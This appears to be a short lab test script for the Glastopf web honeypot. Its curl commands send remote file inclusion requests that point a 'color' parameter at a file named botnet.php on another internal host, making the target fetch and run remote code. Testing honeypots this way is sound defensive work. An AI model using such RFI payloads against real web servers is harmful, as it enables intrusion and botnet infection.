# RFI test for Glastopf
# The botnet.php is stored on the web.ermin server
curl 'http://192.168.1.62/vulnerable.php?color=http://web.ermin/br-mal-files/botnet.php'

# Get a web page from glastopf container
curl 'http://192.168.1.167:8888/vulnerable.php'

# RFI attack against glastopf container
curl 'http://192.168.1.167:8888/vulnerable.php?color=http://192.168.1.102/br-mal-files/botnet.php'

